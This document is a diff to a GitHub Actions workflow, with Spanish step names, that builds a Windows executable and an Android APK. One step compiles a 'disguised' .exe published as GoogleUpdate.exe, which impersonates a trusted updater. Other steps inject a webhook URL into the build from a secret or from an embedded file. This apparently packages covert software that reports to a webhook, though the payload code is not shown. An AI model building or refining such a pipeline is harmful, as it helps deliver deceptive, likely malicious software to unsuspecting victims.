@@ -9,12 +9,11 @@ on:
 permissions:
   contents: write
 
-concurrency:
-  group: build-${{ github.ref }}
-  cancel-in-progress: true
+env:
+  PYTHONUNBUFFERED: "1"
 
 jobs:
-  # ------------------------- WINDOWS (.exe) -------------------------
+  # ------------------------------ WINDOWS ------------------------------
   windows:
     runs-on: windows-latest
     steps:
@@ -24,17 +23,25 @@ jobs:
         with:
           python-version: "3.11"
 
-      - name: Inyectar webhook + iconos
+      - name: Iconos
+        run: |
+          python -m pip install --upgrade pip pillow
+          python tools/make_icons.py
+
+      - name: Webhook por secret (opcional)
         shell: bash
         env:
           WH: ${{ secrets.WEBHOOK_URL }}
         run: |
-          pip install pillow
-          python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ.get('WH',''))"
-          python tools/make_icons.py
+          if [ -n "$WH" ]; then
+            python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ['WH'])"
+            echo "webhook del secret inyectado"
+          else
+            echo "usando el webhook incrustado en _secret.py"
+          fi
 
       - name: Dependencias
-        run: pip install -r requirements.txt pyinstaller
+        run: python -m pip install -r requirements.txt pyinstaller
 
       - name: Compilar .exe disfrazado
         run: >
@@ -49,9 +56,10 @@ jobs:
           path: dist/GoogleUpdate.exe
           if-no-files-found: error
 
-  # -------------------------- ANDROID (.apk) ------------------------
+  # ------------------------------ ANDROID ------------------------------
   android:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-22.04
+    timeout-minutes: 120
     steps:
       - uses: actions/checkout@v4
 
@@ -64,12 +72,25 @@ jobs:
           distribution: temurin
           java-version: "17"
 
+      - name: Liberar disco
+        run: |
+          sudo rm -rf /usr/local/lib/android/sdk/ndk \
+                      /usr/local/lib/android/sdk/emulator \
+                      /usr/local/lib/android/sdk/system-images \
+                      /usr/share/dotnet /opt/ghc /usr/local/share/boost || true
+          df -h
+
       - name: Dependencias del sistema
         run: |
           sudo apt-get update
-          sudo apt-get install -y git zip unzip autoconf libtool pkg-config \
-            zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev automake \
-            build-essential ccache
+          sudo apt-get install -y git zip unzip curl autoconf libtool pkg-config \
+            zlib1g-dev libncurses5-dev libtinfo5 cmake libffi-dev libssl-dev \
+            automake build-essential ccache
+
+      - name: Icono
+        run: |
+          python -m pip install --upgrade pip pillow
+          python tools/make_icons.py
 
       - name: Cache buildozer
         uses: actions/cache@v4
@@ -77,30 +98,41 @@ jobs:
           path: |
             ~/.buildozer
             ~/.gradle
-            .buildozer
-          key: buildozer-${{ runner.os }}-${{ hashFiles('buildozer.spec') }}
-          restore-keys: buildozer-${{ runner.os }}-
+          key: bz-${{ runner.os }}-${{ hashFiles('buildozer.spec') }}
+          restore-keys: bz-${{ runner.os }}-
 
       - name: Instalar buildozer
         run: |
-          pip install --upgrade pip
-          pip install buildozer "cython==0.29.36"
+          python -m pip install --upgrade pip setuptools wheel
+          python -m pip install "buildozer==1.5.0" "cython==0.29.36"
 
-      - name: Inyectar webhook
+      - name: Webhook por secret (opcional)
         env:
           WH: ${{ secrets.WEBHOOK_URL }}
-        run: python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ.get('WH',''))"
+        run: |
+          if [ -n "$WH" ]; then
+            python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ['WH'])"
+          fi
 
       - name: Compilar APK
-        run: yes | buildozer -v android debug
+        run: buildozer -v android debug
+        env:
+          GRADLE_OPTS: "-Xmx2g"
+
+      - name: Volcar log si falla
+        if: failure()
+        run: |
+          echo "=========== buildozer.log (ultimas 250 lineas) ==========="
+          tail -n 250 ~/.buildozer/buildozer.log || true
 
       - uses: actions/upload-artifact@v4
+        if: always()
         with:
           name: android-apk
           path: bin/*.apk
-          if-no-files-found: error
+          if-no-files-found: warn
 
-  # ----------------------------- RELEASE ---------------------------
+  # ------------------------------ RELEASE ------------------------------
   release:
     if: startsWith(github.ref, 'refs/tags/')
     needs: [windows, android]
